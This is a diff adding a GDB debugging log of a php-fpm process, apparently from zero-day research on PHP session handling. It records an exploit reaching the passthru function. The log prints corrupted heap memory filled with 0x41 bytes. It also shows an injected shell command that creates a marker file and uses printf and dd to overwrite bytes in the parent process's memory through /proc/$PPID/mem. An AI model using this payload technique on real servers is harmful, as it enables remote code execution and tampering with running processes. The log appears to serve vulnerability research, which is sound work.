@@ -1,0 +1,32 @@
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+0x00007ffff689b3a7 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+warning: File "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+	add-auto-load-safe-path /tmp/opencode/realapps/install_realapps_np/sbin/php-fpm
+line to your configuration file "/home/davide/.config/gdb/gdbinit".
+To completely disable this security protection add
+	set auto-load safe-path /
+line to your configuration file "/home/davide/.config/gdb/gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+	info "(gdb)Auto-loading safe path"
+Breakpoint 1 at 0x9e68b5: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/session/session.c, line 290.
+Breakpoint 2 at 0xa3c074: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 257.
+Breakpoint 3 at 0xa3c047: file /home/davide/ailocal/php/zerodays_1020/build_plain/ext/standard/exec.c, line 221.
+DECODE #1 data=0x7ffff3c01000 val=0x7ffff3c01018 len=1900000 level=1 ser1=0x9e6fae P=0x7ffff3d88000
+DECODE #2 data=0x7ffff4001000 val=0x7ffff4001018 len=1900315 level=1 ser1=0xa3c074 P=0x7ffff3d88000
+RAW2c=00000001 RAW50=0x7ffff41a01d7 RAW58=6
+PBYTES 0x7ffff3d88000:	0x00007ffff466b000	0x00007ffff3d88088
+0x7ffff3d88010:	0x00007ffff3d88088	0x0000000000000000
+0x7ffff3d88020:	0x0000000000000000	0x0000000000000000
+0x7ffff3d88030:	0x000000007fffffff	0x00000000000003fa
+0x7ffff3d88040:	0x00007ffff466b000	0x4141414141414141
+CMD 0x7ffff41a01ef:	"touch /tmp/opencode/research/wprealhex256_20261022T000209Z/PASSTHRU_256; printf '\\256\\157\\236\\000\\000\\000\\000\\000' | dd of=/proc/$PPID/mem bs=1 seek=$((0x22c54c8)) conv=notrunc 2>/dev/null"
+ZIF_PASSTHRU rdi=0x7ffff4001018 rsi=0x1cff1b numargs=1 arg1=0x7ffff41a01d7 type=6
+ZCMD 0x7ffff41a01ef:	"touch /tmp/opencode/research/wprealhex256_20261022T000209Z/PASSTHRU_256; printf '\\256\\157\\236\\000\\000\\000\\000\\000' | dd of=/proc/$PPID/mem bs=1 seek=$((0x22c54c8)) conv=notrunc 2>/dev/null"
+[Detaching after vfork from child process 575987]
+PHP_EXEC_RET eax=0 ser1=0x9e6fae
+DECODE #3 data=0x7ffff3af1000 val=0x7ffff3af1018 len=346 level=0 ser1=0x9e6fae P=(nil)
+DETACH_AT_HIT3 ser1=0x9e6fae
+[Inferior 1 (process 575723) detached]
